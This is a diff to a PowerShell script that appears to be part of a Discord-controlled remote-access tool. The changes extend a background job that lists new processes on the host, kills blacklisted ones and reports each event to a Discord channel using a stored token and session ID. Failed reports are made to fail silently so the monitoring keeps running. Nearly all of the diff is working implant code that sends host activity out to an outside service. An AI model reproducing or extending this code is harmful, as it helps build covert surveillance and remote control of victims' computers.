@@ -6,6 +6,7 @@ $global:ProcessMonitorJob = $null
 
 #==================================== PROCESS LISTING ====================================
 
+#WORKS
 function MGet_ProcessList {
     param(
         [string]$filter = "",
@@ -58,6 +59,7 @@ function MGet_ProcessList {
 
 #==================================== PROCESS EXECUTION ====================================
 
+#REMOVE
 function MStart_Process {
     param(
         [string]$executablePath,
@@ -223,15 +225,27 @@ function MStart_ProcessMonitoring {
             $global:ProcessWhitelist = $whitelist
             $global:ProcessBlacklist = $blacklist
             
-            # Import functions
+            # Import ALL necessary functions
             ${function:sendMsg} = ${using:function:sendMsg}
+            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
+            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
+            ${function:Send_AsFile} = ${using:function:Send_AsFile}
+            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
+            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
             ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
             
             $knownProcesses = @{}
             
+            # Send initial status message
+            try {
+                sendMsg -Message ":eye: **Process monitoring job started successfully**"
+            } catch {
+                # If sendMsg fails, the job will continue but won't report
+            }
+            
             while ($true) {
                 try {
-                    $currentProcesses = Get-Process | Where-Object { $_.ProcessName -notlike "svchost*" }
+                    $currentProcesses = Get-Process
                     
                     foreach ($proc in $currentProcesses) {
                         $procKey = "$($proc.ProcessName)_$($proc.Id)"
@@ -240,16 +254,27 @@ function MStart_ProcessMonitoring {
                         if (-not $knownProcesses.ContainsKey($procKey)) {
                             $knownProcesses[$procKey] = $proc
                             
-                            # Check if blacklisted
-                            if ($global:ProcessBlacklist -contains $proc.ProcessName) {
+                            # Check if blacklisted (case-insensitive comparison)
+                            $isBlacklisted = $false
+                            foreach ($blacklistedProcess in $global:ProcessBlacklist) {
+                                if ($proc.ProcessName -like $blacklistedProcess) {
+                                    $isBlacklisted = $true
+                                    break
+                                }
+                            }
+                            
+                            if ($isBlacklisted) {
                                 try {
                                     $proc.Kill()
                                     sendMsg -Message ":skull_crossbones: **Blacklisted process terminated:** $($proc.ProcessName) (PID: $($proc.Id))"
                                 } catch {
-                                    sendMsg -Message ":warning: **Failed to terminate blacklisted process:** $($proc.ProcessName) (PID: $($proc.Id))"
+                                    sendMsg -Message ":warning: **Failed to terminate blacklisted process:** $($proc.ProcessName) (PID: $($proc.Id)) - Access Denied"
                                 }
                             } else {
-                                sendMsg -Message ":new: **New process detected:** $($proc.ProcessName) (PID: $($proc.Id))"
+                                # Only report non-system processes to avoid spam
+                                if ($proc.ProcessName -notlike "svchost*" -and $proc.ProcessName -notlike "System*" -and $proc.ProcessName -ne "Idle") {
+                                    sendMsg -Message ":new: **New process detected:** $($proc.ProcessName) (PID: $($proc.Id))"
+                                }
                             }
                         }
                     }
@@ -262,13 +287,20 @@ function MStart_ProcessMonitoring {
                     }
                     
                 } catch {
-                    sendMsg -Message ":x: **Process monitoring error:** $($_.Exception.Message)"
+                    try {
+                        sendMsg -Message ":x: **Process monitoring error:** $($_.Exception.Message)"
+                    } catch {
+                        # Silent fail if sendMsg doesn't work
+                    }
                 }
                 
                 Start-Sleep -Seconds $intervalSeconds
             }
             
         } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessWhitelist, $global:ProcessBlacklist
+        
+        # Wait a moment for the job to initialize
+        Start-Sleep -Seconds 1
         
         sendMsg -Message ":eye: **Process monitoring started** (Interval: ${intervalSeconds}s) - New processes will be reported"
         
@@ -302,8 +334,13 @@ function MStop_ProcessMonitoring {
 
 function MGet_ProcessMonitoringStatus {
     if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
-        $status = $global:ProcessMonitorJob.State
-        sendMsg -Message ":eye: **Process Monitoring Status:** Running (Job State: $status)"
+        $job = $global:ProcessMonitorJob
+        if ($job.State -eq "Running") {
+            sendMsg -Message ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id))"
+            sendMsg -Message ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
+        } else {
+            sendMsg -Message ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))"
+        }
     } else {
         sendMsg -Message ":eye: **Process Monitoring Status:** Stopped"
     }
